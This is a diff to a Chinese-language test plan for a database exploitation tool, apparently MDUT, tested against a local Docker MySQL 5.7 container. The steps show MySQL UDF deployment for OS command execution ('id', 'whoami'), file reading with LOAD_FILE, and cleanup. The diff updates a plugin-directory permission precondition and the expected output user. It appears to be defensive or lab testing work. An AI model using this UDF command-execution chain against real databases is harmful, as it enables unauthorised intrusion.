@@ -147,8 +147,8 @@ unzip -l MDAT-DEV/target/mdut.jar | grep -cE "org/sqlite/|redis/clients/|com/mon
 |---|---|---|
 | 1 | `docker run -d --name mdut-mysql -e MYSQL_ROOT_PASSWORD=123456 -p 13306:3306 mysql:5.7 --secure-file-priv=` | 容器 healthy |
 | 2 | `./cli/mdut --task lab-tc3 add mysql --host 127.0.0.1 --port 13306 --user root --pass 123456 --db mysql` | 退出码 0 + `"id"` |
-| 3 | `./cli/mdut --task lab-tc3 info --id <ID>` | `MySQL 5.7.x` / Linux 64 / UDF 路径 `/usr/lib/mysql/plugin/` |
-| 4 | `./cli/mdut --task lab-tc3 exec --id <ID> 'id'` | 首次触发 UDF 部署链（探测→落盘→建函数）→ 回显 `uid=0(root)` |
+| 3 | `./cli/mdut --task lab-tc3 info --id <ID>`；`docker exec mdut-mysql chown -R mysql:mysql $(docker exec mdut-mysql mysql -uroot -p123456 -N -e "select @@plugin_dir")` | `MySQL 5.7.x` / Linux 64 / info 回显 `plugin_dir`；**chown 是实验前置**（官方镜像 mysqld 以 mysql 用户运行，plugin 目录 root 属主会 EACCES） |
+| 4 | `./cli/mdut --task lab-tc3 exec --id <ID> 'id'` | 首次触发 UDF 部署链（探测→落盘→建函数）→ 回显 `uid=999(mysql)`（=容器内 mysqld 运行用户；非 root 属预期） |
 | 5 | `./cli/mdut --task lab-tc3 exec --id <ID> 'whoami'` → `--sql --id <ID> "select LOAD_FILE('/etc/hostname')"` | 二次调用直接回显；LOAD_FILE 返回容器主机名 |
 | 6 | `./cli/mdut --task lab-tc3 clean --id <ID>` | 退出码 0；容器内查证：`docker exec mdut-mysql mysql -uroot -p123456 -e "select * from mysql.func"` 为空、`ls /usr/lib/mysql/plugin/` 无 `.temp` 遗留 |
 | 7 | `./cli/mdut --task lab-tc3 delete <ID>`；`docker rm -f mdut-mysql`；删 `tasks/lab-tc3` | 资源清零 |
